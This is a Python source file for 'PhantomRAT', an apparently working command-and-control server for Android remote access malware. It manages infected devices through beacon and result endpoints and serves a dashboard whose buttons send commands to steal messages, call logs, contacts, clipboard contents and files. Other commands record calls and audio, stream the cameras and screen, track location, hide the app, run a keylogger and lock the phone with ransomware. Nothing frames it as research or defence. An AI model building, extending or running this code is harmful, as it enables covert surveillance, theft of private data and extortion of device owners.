#!/usr/bin/env python3
"""
PhantomRAT C2 Server v2.0
ID-Based Command & Control - No IP Tracking
"""

import asyncio
import aiohttp
from aiohttp import web
import json
import base64
import hashlib
import os
import time
import uuid
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

# ===== CONFIGURATION =====
HOST = "0.0.0.0"
PORT = 443
SSL_CERT = "server.crt"
SSL_KEY = "server.key"
SECRET_KEY = Fernet.generate_key()
fernet = Fernet(SECRET_KEY)

# Store sessions by ID (not IP!)
sessions = {}
pending_commands = {}

print(f"""
╔══════════════════════════════════════════════════════════════╗
║               🧬 PHANTOMRAT C2 SERVER v2.0                  ║
║               ID-BASED COMMAND & CONTROL                     ║
╠══════════════════════════════════════════════════════════════╣
║  [+] Server Key: {SECRET_KEY[:32]}...  ║
║  [+] Listening on: {HOST}:{PORT}                          ║
║  [+] Sessions use Device-ID (NOT IP)                        ║
║  [+] Sessions never lost - persistent IDs                   ║
╚══════════════════════════════════════════════════════════════╝
""")

# ===== API HANDLERS =====

async def handle_beacon(request):
    """Handle device beacon - ID based"""
    try:
        data = await request.json()
        device_id = data.get("id", "unknown")
        encrypted_payload = data.get("payload", "")
        
        # Decrypt payload
        try:
            payload = json.loads(fernet.decrypt(encrypted_payload.encode()).decode())
        except:
            payload = {"error": "decryption_failed"}
        
        device_ip = request.remote
        user_agent = request.headers.get("User-Agent", "unknown")
        
        # Register/Update session
        if device_id not in sessions:
            sessions[device_id] = {
                "id": device_id,
                "first_seen": time.time(),
                "ip": device_ip,
                "user_agent": user_agent,
                "alias": f"Device_{len(sessions) + 1}",
                "commands_sent": 0,
                "data": {}
            }
            print(f"\n[+] NEW SESSION: {device_id}")
            print(f"    IP: {device_ip}")
            print(f"    UA: {user_agent[:50]}")
        
        session = sessions[device_id]
        session["last_seen"] = time.time()
        session["ip"] = device_ip
        session["data"] = payload.get("data", {})
        session["online"] = True
        
        # Check for pending commands
        if device_id in pending_commands and pending_commands[device_id]:
            cmd = pending_commands[device_id].pop(0)
            session["commands_sent"] += 1
            response = {
                "status": "ok",
                "command": cmd
            }
            print(f"  → Sending command: {cmd.get('type', 'unknown')} to {device_id}")
        else:
            response = {"status": "ok", "command": None}
        
        # Encrypt response
        encrypted_response = fernet.encrypt(json.dumps(response).encode()).decode()
        
        return web.json_response({
            "status": "ok",
            "payload": encrypted_response,
            "session_id": device_id
        })
        
    except Exception as e:
        print(f"[!] Beacon error: {e}")
        return web.json_response({"status": "error", "message": str(e)}, status=500)

async def handle_result(request):
    """Handle command result"""
    try:
        data = await request.json()
        device_id = data.get("id", "unknown")
        command_id = data.get("command_id", "")
        encrypted_result = data.get("result", "")
        
        try:
            result = json.loads(fernet.decrypt(encrypted_result.encode()).decode())
        except:
            result = {"error": "decryption_failed"}
        
        print(f"\n[+] RESULT from {device_id}")
        print(f"    Command: {command_id}")
        print(f"    Data: {json.dumps(result, indent=4)[:500]}")
        
        return web.json_response({"status": "ok"})
        
    except Exception as e:
        print(f"[!] Result error: {e}")
        return web.json_response({"status": "error"}, status=500)

async def handle_dashboard(request):
    """Web dashboard"""
    html = f"""
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🧬 PhantomRAT C2</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }}
            body {{ background: #0a0a1a; color: #e0e0ff; padding: 20px; }}
            .header {{ background: linear-gradient(135deg, #1a1a3e, #0d0d2b); padding: 25px; border-radius: 16px; margin-bottom: 25px; border: 1px solid #2a2a5e; }}
            .header h1 {{ font-size: 28px; background: linear-gradient(90deg, #00d4ff, #7b2ff7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
            .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }}
            .stat-card {{ background: #12122e; padding: 20px; border-radius: 12px; border: 1px solid #2a2a5e; text-align: center; }}
            .stat-card .num {{ font-size: 32px; font-weight: bold; color: #00d4ff; }}
            .stat-card .label {{ color: #8888aa; margin-top: 5px; }}
            .sessions {{ background: #12122e; border-radius: 16px; border: 1px solid #2a2a5e; overflow: hidden; }}
            .sessions-header {{ padding: 20px; border-bottom: 1px solid #2a2a5e; font-size: 18px; }}
            .session-row {{ padding: 15px 20px; border-bottom: 1px solid #1a1a3e; display: grid; grid-template-columns: 2fr 1fr 1fr 1fr 1fr auto; gap: 10px; align-items: center; }}
            .session-row:hover {{ background: #1a1a3e; }}
            .session-row .id {{ color: #00d4ff; font-weight: bold; }}
            .session-row .online {{ color: #00ff88; }}
            .session-row .offline {{ color: #ff4444; }}
            .btn {{ padding: 8px 16px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: all 0.3s; }}
            .btn-primary {{ background: linear-gradient(135deg, #00d4ff, #7b2ff7); color: white; }}
            .btn-danger {{ background: #ff4444; color: white; }}
            .btn:hover {{ transform: translateY(-2px); opacity: 0.9; }}
            .modal {{ display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 1000; }}
            .modal-content {{ background: #1a1a3e; padding: 30px; border-radius: 16px; max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto; }}
            .modal-content h2 {{ margin-bottom: 20px; }}
            .modal-content select, .modal-content input, .modal-content textarea {{ width: 100%; padding: 10px; margin: 10px 0; background: #0a0a1a; border: 1px solid #2a2a5e; border-radius: 8px; color: white; }}
            .cmd-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }}
            .cmd-grid .cmd-btn {{ padding: 12px; background: #0d0d2b; border: 1px solid #2a2a5e; border-radius: 8px; cursor: pointer; text-align: center; transition: all 0.3s; }}
            .cmd-grid .cmd-btn:hover {{ border-color: #7b2ff7; background: #1a1a3e; }}
            .log {{ background: #0a0a1a; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; }}
            .tab {{ padding: 10px 20px; cursor: pointer; border: none; background: transparent; color: #8888aa; font-size: 14px; border-bottom: 2px solid transparent; }}
            .tab.active {{ color: #00d4ff; border-bottom-color: #00d4ff; }}
            @keyframes pulse {{ 0% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} 100% {{ opacity: 1; }} }}
            .live-dot {{ display: inline-block; width: 8px; height: 8px; background: #00ff88; border-radius: 50%; animation: pulse 2s infinite; margin-left: 5px; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🧬 PhantomRAT Command & Control</h1>
            <p style="color:#8888aa;margin-top:10px;">نظام تحكم متطور - ID-Based (بدون IP) | Session Secure | مشفر بالكامل</p>
            <div style="margin-top:15px;display:flex;gap:10px;flex-wrap:wrap;">
                <span class="live-dot"></span>
                <span>الخادم يعمل: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
                <span style="margin-right:20px;">🔑 المفتاح: {SECRET_KEY[:16]}...</span>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="num">{len(sessions)}</div>
                <div class="label">🔌 إجمالي الجلسات</div>
            </div>
            <div class="stat-card">
                <div class="num">{sum(1 for s in sessions.values() if s.get('online'))}</div>
                <div class="label">🟢 متصلة الآن</div>
            </div>
            <div class="stat-card">
                <div class="num">{sum(s.get('commands_sent',0) for s in sessions.values())}</div>
                <div class="label">⚡ أوامر مرسلة</div>
            </div>
            <div class="stat-card">
                <div class="num">{sum(1 for s in sessions.values() if s['data'].get('is_admin'))}</div>
                <div class="label">👑 Admin Active</div>
            </div>
        </div>

        <div style="display:flex;gap:15px;margin-bottom:20px;">
            <button class="tab active" onclick="filterSessions('all')">الكل</button>
            <button class="tab" onclick="filterSessions('online')">المتصلة</button>
            <button class="tab" onclick="filterSessions('offline')">المنفصلة</button>
            <button class="tab" onclick="filterSessions('android')">Android</button>
        </div>

        <div class="sessions">
            <div class="sessions-header">
                📱 الجلسات النشطة
                <span style="float:left;color:#8888aa;font-size:14px;">اضغط على ID لفتح التحكم</span>
            </div>
            <div id="sessionList">
            """
    
    for device_id, session in sorted(sessions.items(), key=lambda x: x[1].get('last_seen',0), reverse=True):
        online = session.get('online', False)
        model = session.get('data', {}).get('model', 'Unknown')
        battery = session.get('data', {}).get('battery', '?')
        last_seen = datetime.fromtimestamp(session.get('last_seen', 0)).strftime('%H:%M:%S')
        admin = "👑" if session.get('data', {}).get('is_admin') else ""
        
        html += f"""
            <div class="session-row" data-online="{str(online).lower()}" data-platform="android">
                <div>
                    <span class="id" onclick="openControl('{device_id}')">{device_id[:16]}..</span>
                    <span style="font-size:12px;color:#8888aa;display:block;">{admin} {model}</span>
                </div>
                <div>
                    <span class="{'online' if online else 'offline'}">{'🟢 متصل' if online else '🔴 غير متصل'}</span>
                </div>
                <div>🔋 {battery}%</div>
                <div>📡 {last_seen}</div>
                <div>⚡ {session.get('commands_sent', 0)}</div>
                <div>
                    <button class="btn btn-primary" onclick="openControl('{device_id}')">🎯 تحكم</button>
                </div>
            </div>
        """
    
    html += """
            </div>
        </div>

        <!-- Control Modal -->
        <div id="controlModal" class="modal" onclick="if(event.target==this)closeModal()">
            <div class="modal-content" onclick="event.stopPropagation()">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                    <h2 id="modalTitle">🎯 التحكم بالجهاز</h2>
                    <button class="btn btn-danger" onclick="closeModal()">✕</button>
                </div>
                
                <div style="margin:15px 0;">
                    <label>📝 كتابة أمر يدوي:</label>
                    <textarea id="manualCommand" rows="2" placeholder='{"type": "get_device_info", "params": {}}'></textarea>
                    <button class="btn btn-primary" onclick="sendManual()">📤 إرسال</button>
                </div>

                <div style="margin:15px 0;">
                    <label>⚡ الأوامر السريعة:</label>
                    <div class="cmd-grid">
                        <div class="cmd-btn" onclick="sendCmd('get_sms')">💬 سحب الرسائل</div>
                        <div class="cmd-btn" onclick="sendCmd('get_sms_old')">📜 رسائل قديمة</div>
                        <div class="cmd-btn" onclick="sendCmd('get_sms_new')">🆕 رسائل جديدة</div>
                        <div class="cmd-btn" onclick="sendCmd('get_call_logs')">📞 سجلات المكالمات</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('record_call', {})">🎙️ تسجيل مكالمة</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('ransomware_lock', {'message':'تم اختراق جهازك!','key':'decrypt123'})">🔒 رانسوم وير</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('ransomware_unlock', {'key':'decrypt123'})">🔓 فك الرانسوم</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('camera_capture_back', {})">📸 تصوير خلفي</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('camera_capture_front', {})">🤳 تصوير أمامي</div>
                        <div class="cmd-btn" onclick="sendCmd('camera_stream_start_back')">📡 بث مباشر خلفي</div>
                        <div class="cmd-btn" onclick="sendCmd('camera_stream_start_front')">📡 بث مباشر أمامي</div>
                        <div class="cmd-btn" onclick="sendCmd('camera_stream_stop')">⏹️ إيقاف البث</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('audio_record', {'duration':30})">🎤 تسجيل صوت 30ث</div>
                        <div class="cmd-btn" onclick="sendCmd('get_location')">📍 الموقع</div>
                        <div class="cmd-btn" onclick="sendCmd('get_location_precise')">📍 موقع دقيق</div>
                        <div class="cmd-btn" onclick="sendCmd('hide_app')">🕳️ إخفاء التطبيق</div>
                        <div class="cmd-btn" onclick="sendCmd('get_device_info')">ℹ️ معلومات الجهاز</div>
                        <div class="cmd-btn" onclick="sendCmd('get_contacts')">👥 جهات الاتصال</div>
                        <div class="cmd-btn" onclick="sendCmd('get_clipboard')">📋 الحافظة</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('file_list', {'path':'/'})">📁 سحب ملفات</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('file_download', {'path':'/storage/emulated/0/DCIM'})">⬇️ تحميل ملفات</div>
                        <div class="cmd-btn" onclick="sendCmd('screen_stream_start')">🖥️ بث الشاشة</div>
                        <div class="cmd-btn" onclick="sendCmd('screen_stream_stop')">⏹️ إيقاف بث الشاشة</div>
                        <div class="cmd-btn" onclick="sendCmd('keylogger_start')">⌨️ تشغيل كيلوجر</div>
                        <div class="cmd-btn" onclick="sendCmd('keylogger_get_logs')">📋 سجل الكيلوجر</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('open_url', {'url':'https://google.com'})">🌐 فتح رابط</div>
                        <div class="cmd-btn" onclick="sendCmdWithParam('vibrate', {'duration':2000})">📳 هز الجهاز</div>
                    </div>
                </div>

                <div style="margin:15px 0;">
                    <label>📊 آخر نتيجة:</label>
                    <div id="lastResult" class="log">لا توجد نتائج بعد</div>
                </div>
            </div>
        </div>

        <script>
            let currentDeviceId = null;

            function filterSessions(filter) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                event.target.classList.add('active');
                document.querySelectorAll('.session-row').forEach(row => {
                    const online = row.dataset.online === 'true';
                    const platform = row.dataset.platform;
                    if (filter === 'all') row.style.display = 'grid';
                    else if (filter === 'online') row.style.display = online ? 'grid' : 'none';
                    else if (filter === 'offline') row.style.display = !online ? 'grid' : 'none';
                    else if (filter === 'android') row.style.display = 'grid';
                });
            }

            function openControl(deviceId) {
                currentDeviceId = deviceId;
                document.getElementById('modalTitle').textContent = '🎯 التحكم بـ ' + deviceId;
                document.getElementById('controlModal').style.display = 'flex';
                document.getElementById('lastResult').textContent = 'جاري الاتصال...';
            }

            function closeModal() {
                document.getElementById('controlModal').style.display = 'none';
            }

            function sendCmd(cmdType) {
                sendCmdWithParam(cmdType, {});
            }

            function sendCmdWithParam(cmdType, params) {
                if (!currentDeviceId) return;
                const cmd = { type: cmdType, params: params };
                
                fetch('/api/send_command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ device_id: currentDeviceId, command: cmd })
                })
                .then(r => r.json())
                .then(data => {
                    document.getElementById('lastResult').textContent = 
                        '✅ أمر مرسل: ' + cmdType + '\\n' + JSON.stringify(data, null, 2);
                })
                .catch(err => {
                    document.getElementById('lastResult').textContent = '❌ خطأ: ' + err;
                });
            }

            function sendManual() {
                const cmdText = document.getElementById('manualCommand').value;
                try {
                    const cmd = JSON.parse(cmdText);
                    sendCmdWithParam(cmd.type || 'unknown', cmd.params || {});
                } catch(e) {
                    document.getElementById('lastResult').textContent = '❌ JSON غير صحيح: ' + e.message;
                }
            }

            // Auto-refresh every 2 seconds
            setInterval(() => { location.reload(); }, 3000);
        </script>
    </body>
    </html>
    """
    return web.Response(text=html, content_type='text/html')

async def handle_send_command(request):
    """API to send command to device"""
    try:
        data = await request.json()
        device_id = data.get("device_id", "")
        command = data.get("command", {})
        
        if device_id not in pending_commands:
            pending_commands[device_id] = []
        
        pending_commands[device_id].append(command)
        
        return web.json_response({
            "status": "queued",
            "device_id": device_id,
            "command_type": command.get("type", "unknown"),
            "position": len(pending_commands[device_id])
        })
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)}, status=500)

async def handle_sessions_json(request):
    """Return sessions as JSON"""
    return web.json_response({
        "total": len(sessions),
        "online": sum(1 for s in sessions.values() if s.get('online')),
        "sessions": {k: {**v, 'data': {}} for k, v in sessions.items()}
    })

# ===== APP SETUP =====
app = web.Application()
app.router.add_post('/api/v2/beacon', handle_beacon)
app.router.add_post('/api/v2/result', handle_result)
app.router.add_post('/api/send_command', handle_send_command)
app.router.add_get('/api/sessions', handle_sessions_json)
app.router.add_get('/', handle_dashboard)
app.router.add_get('/dashboard', handle_dashboard)

if __name__ == '__main__':
    print(f"[*] Starting PhantomRAT C2 Server...")
    print(f"[*] Dashboard: https://{HOST}:{PORT}/")
    print(f"[*] API: https://{HOST}:{PORT}/api/v2/beacon")
    print(f"[*] Encryption: Fernet (AES-128-CBC)")
    print(f"[*] Session Mode: ID-Based (No IP tracking)")
    print(f"[*] Press Ctrl+C to stop")
    
    web.run_app(app, host=HOST, port=PORT, ssl_context=None)  # Set ssl_context for HTTPS
